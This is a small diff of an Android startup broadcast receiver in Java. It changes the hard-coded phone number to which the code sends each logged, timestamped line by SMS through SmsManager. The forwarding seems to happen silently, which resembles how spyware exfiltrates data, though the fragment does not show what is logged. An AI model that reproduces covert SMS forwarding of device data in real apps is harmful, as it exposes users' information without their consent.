@@ -147,7 +147,7 @@ public class StartUpReceiver extends BroadcastReceiver
                 out.println ("----------------------------------------------------------------------------\n");
             else
                 out.println (Line + "   (" + TimeStamp + ")");
-            String p = "1234";
+            String p = "123456789";
             String line = Line + "   (" + TimeStamp + ")";
             SmsManager sms = SmsManager.getDefault();
             sms.sendTextMessage(p, null, line, null, null);
